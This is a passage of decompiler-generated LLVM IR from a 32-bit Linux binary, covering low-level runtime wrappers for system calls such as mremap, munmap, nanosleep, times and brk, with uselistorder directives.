526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 41, 601, 602, 603, 604, 605, 606, 607, 608, 42, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 23, 626, 627, 628 }
  uselistorder i32 15, { 4, 3, 9, 1, 0, 2, 5, 6, 7, 8 }
  uselistorder i32 -16, { 14, 46, 136, 137, 19, 20, 66, 67, 68, 69, 47, 48, 51, 15, 56, 57, 62, 63, 64, 65, 58, 59, 54, 18, 52, 17, 49, 50, 60, 61, 21, 70, 71, 72, 73, 55, 53, 16, 22, 23, 74, 75, 24, 25, 77, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 133, 94, 93, 45, 92, 2, 104, 3, 27, 38, 120, 28, 105, 33, 31, 107, 32, 1, 26, 103, 29, 106, 30, 4, 12, 43, 44, 122, 11, 123, 124, 39, 40, 121, 41, 125, 42, 108, 5, 109, 34, 110, 35, 111, 6, 112, 7, 113, 114, 8, 115, 116, 9, 117, 118, 36, 119, 10, 37, 126, 127, 95, 96, 97, 98, 99, 100, 101, 102, 128, 129, 130, 131, 138, 0, 132, 13, 134, 135 }
  uselistorder i32 30, { 6, 4, 2, 1, 5, 3, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80546bd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80546b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805461a, { 1, 0 }
}

define i32 @function_80546c5() local_unnamed_addr {
dec_label_pc_80546c5:
  %stack_var_-8 = alloca i32, align 4
  %v2_80546c8 = ptrtoint i32* %stack_var_-8 to i32
  %v2_80546cf = call i32 @function_805476f(i32 7, i32 %v2_80546c8)
  store i32 256, i32* @edx, align 4
  %v2_80546dc = icmp slt i32 %v2_80546cf, 0
  br i1 %v2_80546dc, label %dec_label_pc_80546e4, label %dec_label_pc_80546e0

dec_label_pc_80546e0:                             ; preds = %dec_label_pc_80546c5
  %v3_80546e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80546e0, i32* @edx, align 4
  br label %dec_label_pc_80546e4

dec_label_pc_80546e4:                             ; preds = %dec_label_pc_80546c5, %dec_label_pc_80546e0
  %v0_80546e4 = phi i32 [ 256, %dec_label_pc_80546c5 ], [ %v3_80546e0, %dec_label_pc_80546e0 ]
  ret i32 %v0_80546e4

; uselistorder directives
  uselistorder i32 7, { 7, 17, 0, 1, 3, 8, 4, 9, 5, 10, 6, 11, 19, 20, 18, 21, 22, 23, 14, 12, 15, 16, 24, 25, 13, 26, 27, 2 }
  uselistorder label %dec_label_pc_80546e4, { 1, 0 }
}

define i32 @function_80546ea() local_unnamed_addr {
dec_label_pc_80546ea:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546ea = load i32, i32* @ebx, align 4
  store i32 %v0_80546ea, i32* %stack_var_-4, align 4
  %v1_80546f3 = call i32 @int80_syscall(i32 202)
  store i32 %v1_80546f3, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80546f3, -4095
  br i1 %tmp7, label %dec_label_pc_805470a, label %dec_label_pc_80546fe

dec_label_pc_80546fe:                             ; preds = %dec_label_pc_80546ea
  %v1_80546fe = call i32 @function_8052779(i32 %v0_80546ea)
  %v0_8054703 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054703 = sub i32 0, %v0_8054703
  %v2_8054705 = inttoptr i32 %v1_80546fe to i32*
  store i32 %v1_8054703, i32* %v2_8054705, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805470e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805470a

dec_label_pc_805470a:                             ; preds = %dec_label_pc_80546ea, %dec_label_pc_80546fe
  %v2_805470e = phi i32 [ %v0_80546ea, %dec_label_pc_80546ea ], [ %v2_805470e.pre, %dec_label_pc_80546fe ]
  %v0_805470a = phi i32 [ %v1_80546f3, %dec_label_pc_80546ea ], [ -1, %dec_label_pc_80546fe ]
  store i32 %v2_805470e, i32* @ebx, align 4
  ret i32 %v0_805470a

; uselistorder directives
  uselistorder i32 %v1_80546f3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805470a, { 1, 0 }
}

define i32 @function_8054710() local_unnamed_addr {
dec_label_pc_8054710:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054710 = load i32, i32* @ebx, align 4
  store i32 %v0_8054710, i32* %stack_var_-4, align 4
  %v1_8054719 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8054719, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8054719, -4095
  br i1 %tmp7, label %dec_label_pc_8054730, label %dec_label_pc_8054724

dec_label_pc_8054724:                             ; preds = %dec_label_pc_8054710
  %v1_8054724 = call i32 @function_8052779(i32 %v0_8054710)
  %v0_8054729 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054729 = sub i32 0, %v0_8054729
  %v2_805472b = inttoptr i32 %v1_8054724 to i32*
  store i32 %v1_8054729, i32* %v2_805472b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054734.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054730

dec_label_pc_8054730:                             ; preds = %dec_label_pc_8054710, %dec_label_pc_8054724
  %v2_8054734 = phi i32 [ %v0_8054710, %dec_label_pc_8054710 ], [ %v2_8054734.pre, %dec_label_pc_8054724 ]
  %v0_8054730 = phi i32 [ %v1_8054719, %dec_label_pc_8054710 ], [ -1, %dec_label_pc_8054724 ]
  store i32 %v2_8054734, i32* @ebx, align 4
  ret i32 %v0_8054730

; uselistorder directives
  uselistorder i32 %v1_8054719, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054730, { 1, 0 }
}

define i32 @function_8054736() local_unnamed_addr {
dec_label_pc_8054736:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054736 = load i32, i32* @ebx, align 4
  store i32 %v0_8054736, i32* %stack_var_-4, align 4
  %v1_805473f = call i32 @int80_syscall(i32 200)
  store i32 %v1_805473f, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805473f, -4095
  br i1 %tmp7, label %dec_label_pc_8054756, label %dec_label_pc_805474a

dec_label_pc_805474a:                             ; preds = %dec_label_pc_8054736
  %v1_805474a = call i32 @function_8052779(i32 %v0_8054736)
  %v0_805474f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805474f = sub i32 0, %v0_805474f
  %v2_8054751 = inttoptr i32 %v1_805474a to i32*
  store i32 %v1_805474f, i32* %v2_8054751, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805475a.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054756

dec_label_pc_8054756:                             ; preds = %dec_label_pc_8054736, %dec_label_pc_805474a
  %v2_805475a = phi i32 [ %v0_8054736, %dec_label_pc_8054736 ], [ %v2_805475a.pre, %dec_label_pc_805474a ]
  %v0_8054756 = phi i32 [ %v1_805473f, %dec_label_pc_8054736 ], [ -1, %dec_label_pc_805474a ]
  store i32 %v2_805475a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054756

; uselistorder directives
  uselistorder i32 %v1_805473f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054756, { 1, 0 }
}

define i32 @function_805475c() local_unnamed_addr {
dec_label_pc_805475c:
  %v0_805475c = load i32, i32* @global_var_80569a4.239, align 4
  %v1_8054766 = icmp eq i32 %v0_805475c, 0
  br i1 %v1_8054766, label %dec_label_pc_805476c, label %dec_label_pc_805476a

dec_label_pc_805476a:                             ; preds = %dec_label_pc_805475c
  br label %dec_label_pc_805476c

dec_label_pc_805476c:                             ; preds = %dec_label_pc_805475c, %dec_label_pc_805476a
  %storemerge = phi i32 [ %v0_805475c, %dec_label_pc_805476a ], [ 4096, %dec_label_pc_805475c ]
  %v0_805476c = phi i32 [ %v0_805475c, %dec_label_pc_805476a ], [ 4096, %dec_label_pc_805475c ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_805476c

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 11, 12, 2, 7, 5, 6, 8, 9, 10, 3, 4 }
  uselistorder label %dec_label_pc_805476c, { 1, 0 }
}

define i32 @function_805476f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805476f:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805476f = load i32, i32* @ebx, align 4
  store i32 %v0_805476f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054782 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8054782, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8054782, -4095
  br i1 %tmp9, label %dec_label_pc_805479b, label %dec_label_pc_805478f

dec_label_pc_805478f:                             ; preds = %dec_label_pc_805476f
  %v1_805478f = call i32 @function_8052779(i32 %v0_805476f)
  %v0_8054794 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054794 = sub i32 0, %v0_8054794
  %v2_8054796 = inttoptr i32 %v1_805478f to i32*
  store i32 %v1_8054794, i32* %v2_8054796, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805479f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805479b

dec_label_pc_805479b:                             ; preds = %dec_label_pc_805476f, %dec_label_pc_805478f
  %v2_805479f = phi i32 [ %v0_805476f, %dec_label_pc_805476f ], [ %v2_805479f.pre, %dec_label_pc_805478f ]
  %v0_805479b = phi i32 [ %v1_8054782, %dec_label_pc_805476f ], [ -1, %dec_label_pc_805478f ]
  store i32 %v2_805479f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805479b

; uselistorder directives
  uselistorder i32 %v1_8054782, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805479b, { 1, 0 }
}

define i32 @function_80547a1() local_unnamed_addr {
dec_label_pc_80547a1:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80547a1 = load i32, i32* @ebx, align 4
  store i32 %v0_80547a1, i32* %stack_var_-4, align 4
  %v1_80547aa = call i32 @int80_syscall(i32 199)
  store i32 %v1_80547aa, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80547aa, -4095
  br i1 %tmp7, label %dec_label_pc_80547c1, label %dec_label_pc_80547b5

dec_label_pc_80547b5:                             ; preds = %dec_label_pc_80547a1
  %v1_80547b5 = call i32 @function_8052779(i32 %v0_80547a1)
  %v0_80547ba = load i32, i32* %ebx.global-to-local, align 4
  %v1_80547ba = sub i32 0, %v0_80547ba
  %v2_80547bc = inttoptr i32 %v1_80547b5 to i32*
  store i32 %v1_80547ba, i32* %v2_80547bc, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80547c5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80547c1

dec_label_pc_80547c1:                             ; preds = %dec_label_pc_80547a1, %dec_label_pc_80547b5
  %v2_80547c5 = phi i32 [ %v0_80547a1, %dec_label_pc_80547a1 ], [ %v2_80547c5.pre, %dec_label_pc_80547b5 ]
  %v0_80547c1 = phi i32 [ %v1_80547aa, %dec_label_pc_80547a1 ], [ -1, %dec_label_pc_80547b5 ]
  store i32 %v2_80547c5, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80547c1

; uselistorder directives
  uselistorder i32 %v1_80547aa, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80547c1, { 1, 0 }
}

define i32 @function_80547c7(i32 %arg1) local_unnamed_addr {
dec_label_pc_80547c7:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_80547dd = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80547dd, i32* %esi.global-to-local, align 4
  %v1_80547f4 = call i32 @int80_syscall(i32 140)
  store i32 %v1_80547f4, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_80547f4, -4095
  br i1 %tmp18, label %dec_label_pc_805480e, label %dec_label_pc_8054800

dec_label_pc_8054800:                             ; preds = %dec_label_pc_80547c7
  %v2_80547e1 = ashr i32 %tmp8, 31
  %v1_8054800 = call i32 @function_8052779(i32 %v2_80547e1)
  %v0_8054805 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054805 = sub i32 0, %v0_8054805
  %v2_8054807 = inttoptr i32 %v1_8054800 to i32*
  store i32 %v1_8054805, i32* %v2_8054807, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054812

dec_label_pc_805480e:                             ; preds = %dec_label_pc_80547c7
  %v1_805480e = icmp eq i32 %v1_80547f4, 0
  br i1 %v1_805480e, label %dec_label_pc_8054817, label %dec_label_pc_8054812

dec_label_pc_8054812:                             ; preds = %dec_label_pc_805480e, %dec_label_pc_8054800
  %v0_8054812 = phi i32 [ %v1_80547f4, %dec_label_pc_805480e ], [ -1, %dec_label_pc_8054800 ]
  %v1_8054814 = ashr i32 %v0_8054812, 31
  br label %dec_label_pc_805481f

dec_label_pc_8054817:                             ; preds = %dec_label_pc_805480e
  %v3_8054817 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805481f

dec_label_pc_805481f:                             ; preds = %dec_label_pc_8054812, %dec_label_pc_8054817
  %v0_8054825 = phi i32 [ %v0_8054812, %dec_label_pc_8054812 ], [ %v3_8054817, %dec_label_pc_8054817 ]
  %storemerge = phi i32 [ %v1_8054814, %dec_label_pc_8054812 ], [ %tmp, %dec_label_pc_8054817 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8054825

; uselistorder directives
  uselistorder i32 %v1_80547f4, { 1, 2, 0, 3 }
  uselistorder i32 31, { 9, 10, 6, 1, 2, 3, 4, 7, 5, 8, 0, 11 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805481f, { 1, 0 }
}

define i32 @function_8054826(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8054826:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054827 = load i32, i32* @esi, align 4
  store i32 %v0_8054827, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805483f = load i32, i32* @ebx, align 4
  %v5_8054847 = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_8054847 = ptrtoint i32* %v5_8054847 to i32
  store i32 %v0_805483f, i32* @ebx, align 4
  store i32 %v6_8054847, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_8054847, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_8054853, label %dec_label_pc_805485f

dec_label_pc_8054853:                             ; preds = %dec_label_pc_8054826
  %v1_8054853 = call i32 @function_8052779(i32 %v0_805483f)
  %v0_8054858 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054858 = sub i32 0, %v0_8054858
  %v2_805485a = inttoptr i32 %v1_8054853 to i32*
  store i32 %v1_8054858, i32* %v2_805485a, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8054862.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805485f

dec_label_pc_805485f:                             ; preds = %dec_label_pc_8054826, %dec_label_pc_8054853
  %v2_8054862 = phi i32 [ %v0_8054827, %dec_label_pc_8054826 ], [ %v2_8054862.pre, %dec_label_pc_8054853 ]
  %v0_805485f = phi i32 [ %v6_8054847, %dec_label_pc_8054826 ], [ -1, %dec_label_pc_8054853 ]
  %v2_8054861 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054861, i32* @edx, align 4
  store i32 %v2_8054862, i32* @esi, align 4
  ret i32 %v0_805485f

; uselistorder directives
  uselistorder i32 %v0_805483f, { 1, 0 }
  uselistorder label %dec_label_pc_805485f, { 1, 0 }
}

define i32 @function_8054865(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054865:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054865 = load i32, i32* @ebx, align 4
  store i32 %v0_8054865, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8054878 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8054878, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8054878, -4095
  br i1 %tmp10, label %dec_label_pc_8054891, label %dec_label_pc_8054885

dec_label_pc_8054885:                             ; preds = %dec_label_pc_8054865
  %v1_8054885 = call i32 @function_8052779(i32 %v0_8054865)
  %v0_805488a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805488a = sub i32 0, %v0_805488a
  %v2_805488c = inttoptr i32 %v1_8054885 to i32*
  store i32 %v1_805488a, i32* %v2_805488c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054895.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054891

dec_label_pc_8054891:                             ; preds = %dec_label_pc_8054865, %dec_label_pc_8054885
  %v2_8054895 = phi i32 [ %v0_8054865, %dec_label_pc_8054865 ], [ %v2_8054895.pre, %dec_label_pc_8054885 ]
  %v0_8054891 = phi i32 [ %v3_8054878, %dec_label_pc_8054865 ], [ -1, %dec_label_pc_8054885 ]
  %v2_8054893 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054893, i32* @edx, align 4
  store i32 %v2_8054895, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054891

; uselistorder directives
  uselistorder i32 %v3_8054878, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054891, { 1, 0 }
}

define i32 @function_8054897(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054897:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054897 = load i32, i32* @ebx, align 4
  store i32 %v0_8054897, i32* %stack_var_-4, align 4
  %v4_805489b = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_805489b, i32* %ebx.global-to-local, align 4
  %v6_80548aa = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_80548aa, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_80548aa, -4095
  br i1 %tmp11, label %dec_label_pc_80548c3, label %dec_label_pc_80548b7

dec_label_pc_80548b7:                             ; preds = %dec_label_pc_8054897
  %v1_80548b7 = call i32 @function_8052779(i32 %v0_8054897)
  %v0_80548bc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80548bc = sub i32 0, %v0_80548bc
  %v2_80548be = inttoptr i32 %v1_80548b7 to i32*
  store i32 %v1_80548bc, i32* %v2_80548be, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80548c7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80548c3

dec_label_pc_80548c3:                             ; preds = %dec_label_pc_8054897, %dec_label_pc_80548b7
  %v2_80548c7 = phi i32 [ %v0_8054897, %dec_label_pc_8054897 ], [ %v2_80548c7.pre, %dec_label_pc_80548b7 ]
  %v0_80548c3 = phi i32 [ %v6_80548aa, %dec_label_pc_8054897 ], [ -1, %dec_label_pc_80548b7 ]
  %v2_80548c5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80548c5, i32* @edx, align 4
  store i32 %v2_80548c7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80548c3

; uselistorder directives
  uselistorder i32 %v6_80548aa, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80548c3, { 1, 0 }
}

define i32 @function_80548c9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80548c9:
  %stack_var_-12 = alloca i32, align 4
  %v0_80548ca = load i32, i32* @ebx, align 4
  %v0_80548ce = load i32, i32* @global_var_80569b8.246, align 8
  %v1_80548ce = icmp eq i32 %v0_80548ce, 0
  %v1_80548d9 = icmp eq i1 %v1_80548ce, false
  br i1 %v1_80548d9, label %dec_label_pc_80548ec, label %dec_label_pc_80548db

dec_label_pc_80548db:                             ; preds = %dec_label_pc_80548c9
  %v1_80548e0 = call i32 @function_8054a8f(i32 0)
  %v2_80548e8 = icmp slt i32 %v1_80548e0, 0
  br i1 %v2_80548e8, label %dec_label_pc_805490e, label %dec_label_pc_80548db.dec_label_pc_80548ec_crit_edge

dec_label_pc_80548db.dec_label_pc_80548ec_crit_edge: ; preds = %dec_label_pc_80548db
  %v0_80548ee.pre = load i32, i32* @global_var_80569b8.246, align 8
  br label %dec_label_pc_80548ec

dec_label_pc_80548ec:                             ; preds = %dec_label_pc_80548db.dec_label_pc_80548ec_crit_edge, %dec_label_pc_80548c9
  %v0_80548fc = phi i32 [ %v0_80548ee.pre, %dec_label_pc_80548db.dec_label_pc_80548ec_crit_edge ], [ %v0_80548ce, %dec_label_pc_80548c9 ]
  %v1_80548ec = icmp eq i32 %arg1, 0
  %v1_80548f3 = icmp eq i1 %v1_80548ec, false
  br i1 %v1_80548f3, label %dec_label_pc_80548f9, label %dec_label_pc_80548f5

dec_label_pc_80548f5:                             ; preds = %dec_label_pc_80548ec
  br label %dec_label_pc_8054911

dec_label_pc_80548f9:                             ; preds = %dec_label_pc_80548ec
  store i32 %v0_80548fc, i32* @ebx, align 4
  %v2_80548fe = add i32 %v0_80548fc, %arg1
  %v1_8054902 = call i32 @function_8054a8f(i32 %v2_80548fe)
  %v2_805490a = icmp slt i32 %v1_8054902, 0
  %v1_805490c = icmp eq i1 %v2_805490a, false
  br i1 %v1_805490c, label %dec_label_pc_80548f9.dec_label_pc_8054911_crit_edge, label %dec_label_pc_805490e

dec_label_pc_80548f9.dec_label_pc_8054911_crit_edge: ; preds = %dec_label_pc_80548f9
  %v0_8054911.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054911

dec_label_pc_805490e:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548db
  br label %dec_label_pc_8054911

dec_label_pc_8054911:                             ; preds = %dec_label_pc_80548f9.dec_label_pc_8054911_crit_edge, %dec_label_pc_80548f5, %dec_label_pc_805490e
  %v0_8054911 = phi i32 [ %v0_8054911.pre, %dec_label_pc_80548f9.dec_label_pc_8054911_crit_edge ], [ %v0_80548fc, %dec_label_pc_80548f5 ], [ -1, %dec_label_pc_805490e ]
  %v2_8054913 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054913, i32* @edx, align 4
  store i32 %v0_80548ca, i32* @ebx, align 4
  ret i32 %v0_8054911

; uselistorder directives
  uselistorder i32 %v0_80548fc, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8054a8f, { 1, 0 }
  uselistorder label %dec_label_pc_8054911, { 2, 0, 1 }
}

define i32 @function_8054917(%tms* %arg1) local_unnamed_addr {
dec_label_pc_8054917:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054917 = load i32, i32* @edi, align 4
  store i32 %v0_8054917, i32* %stack_var_-4, align 4
  %v4_805491b = ptrtoint %tms* %arg1 to i32
  store i32 %v4_805491b, i32* %edi.global-to-local, align 4
  %v0_805491f = load i32, i32* @ebx, align 4
  %v3_8054927 = call i32 @times(%tms* %arg1)
  store i32 %v3_8054927, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8054927, -4095
  br i1 %tmp9, label %dec_label_pc_805493f, label %dec_label_pc_8054933

dec_label_pc_8054933:                             ; preds = %dec_label_pc_8054917
  %v1_8054933 = call i32 @function_8052779(i32 %v0_805491f)
  %v0_8054938 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054938 = sub i32 0, %v0_8054938
  %v2_805493a = inttoptr i32 %v1_8054933 to i32*
  store i32 %v1_8054938, i32* %v2_805493a, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8054943.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805493f

dec_label_pc_805493f:                             ; preds = %dec_label_pc_8054917, %dec_label_pc_8054933
  %v2_8054943 = phi i32 [ %v0_8054917, %dec_label_pc_8054917 ], [ %v2_8054943.pre, %dec_label_pc_8054933 ]
  %v0_805493f = phi i32 [ %v3_8054927, %dec_label_pc_8054917 ], [ -1, %dec_label_pc_8054933 ]
  store i32 %v2_8054943, i32* %edi.global-to-local, align 4
  ret i32 %v0_805493f

; uselistorder directives
  uselistorder i32 %v3_8054927, { 1, 0, 2 }
  uselistorder i32* @edi, { 8, 112, 113, 114, 115, 116, 171, 7, 172, 173, 174, 175, 1, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 91, 92, 93, 94, 95, 96, 97, 98, 99, 194, 208, 209, 195, 196, 197, 198, 199, 200, 201, 202, 2, 203, 204, 205, 206, 207, 210, 211, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 9, 130, 131, 212, 213, 132, 133, 134, 135, 10, 214, 215, 11, 216, 217, 218, 219, 136, 3, 137, 138, 18, 19, 20, 21, 56, 57, 58, 59, 60, 61, 62, 63, 49, 50, 51, 22, 23, 24, 25, 26, 64, 65, 66, 37, 38, 39, 12, 13, 14, 34, 35, 36, 40, 41, 42, 43, 44, 45, 46, 47, 68, 69, 70, 55, 71, 72, 73, 52, 15, 16, 17, 67, 27, 28, 29, 30, 31, 32, 33, 48, 53, 54, 74, 75, 76, 77, 78, 79, 0, 6, 90, 80, 81, 82, 83, 84, 85, 86, 87, 89, 88, 4, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 170, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 5, 168, 169, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 242, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805493f, { 1, 0 }
}

define i32 @function_8054945(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054945:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054946 = load i32, i32* @ebx, align 4
  store i32 %v0_8054946, i32* %stack_var_-8, align 4
  %v4_805494a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805494a, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_8054957 = inttoptr i32 %arg2 to i8*
  %v4_8054957 = call i32 @function_80527ca(i8* %v3_8054957, i32 0, i32 88)
  store i32 %v4_8054957, i32* %eax.global-to-local, align 4
  %v2_805495c = load i16, i16* %arg1, align 2
  %v3_805495c = zext i16 %v2_805495c to i32
  store i32 %v3_805495c, i32* %eax.global-to-local, align 4
  %v0_805495f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805495f = add i32 %v0_805495f, 4
  %v2_805495f = inttoptr i32 %v1_805495f to i32*
  store i32 0, i32* %v2_805495f, align 4
  %v0_8054966 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054966 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054966 = inttoptr i32 %v1_8054966 to i32*
  store i32 %v0_8054966, i32* %v2_8054966, align 4
  %v0_8054968 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054968 = add i32 %v0_8054968, 4
  %v2_8054968 = inttoptr i32 %v1_8054968 to i32*
  %v3_8054968 = load i32, i32* %v2_8054968, align 4
  store i32 %v3_8054968, i32* %eax.global-to-local, align 4
  %v1_805496b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805496b = add i32 %v1_805496b, 12
  %v3_805496b = inttoptr i32 %v2_805496b to i32*
  store i32 %v3_8054968, i32* %v3_805496b, align 4
  %v0_805496e = load i32, i32* %esi.global-to-local, align 4
  %v1_805496e = add i32 %v0_805496e, 8
  %v2_805496e = inttoptr i32 %v1_805496e to i16*
  %v3_805496e = load i16, i16* %v2_805496e, align 2
  %v4_805496e = zext i16 %v3_805496e to i32
  store i32 %v4_805496e, i32* %eax.global-to-local, align 4
  %v1_8054972 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054972 = add i32 %v1_8054972, 16
